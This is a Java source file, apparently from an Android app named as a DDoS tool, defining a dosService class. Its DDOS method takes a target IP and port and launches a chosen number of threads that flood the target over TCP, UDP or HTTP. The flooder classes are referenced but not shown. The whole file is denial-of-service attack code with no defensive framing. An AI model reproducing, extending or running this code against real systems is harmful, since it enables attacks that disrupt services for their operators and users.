package com.notebook.idealabs.ddosbandwidththrottlelite;

/**
 * Created by Admin on 10-09-2017.
 */

public class dosService {
    public static boolean error = false;
    public static boolean firing = false;

    public void DDOS(String ip, int port, int method, int threads, int timeout, String message, int pause) {
        firing = true;
        int i;
        switch (method) {
            case 0:
                try {
                    TCP[] socketThreadsTCP = new TCP[threads];
                    for (i = 0; i < threads; i++) {
                        socketThreadsTCP[i] = new TCP(ip, port, timeout, message, pause);
                        new Thread(socketThreadsTCP[i]).start();
                    }
                    return;
                } catch (Error e) {
                    error = true;
                    e.printStackTrace();
                    return;
                }
            case 1:
                UDP[] socketThreadsUDP = new UDP[threads];
                for (i = 0; i < threads; i++) {
                    socketThreadsUDP[i] = new UDP(ip, port, message, pause);
                    new Thread(socketThreadsUDP[i]).start();
                }
                return;
            case 2:
                HTTP[] socketThreadsHTTP = new HTTP[threads];
                for (i = 0; i < threads; i++) {
                    socketThreadsHTTP[i] = new HTTP(ip, timeout, pause);
                    new Thread(socketThreadsHTTP[i]).start();
                }
                return;
            default:
                return;
        }
    }

    public void stop() {
        firing = false;
    }
}

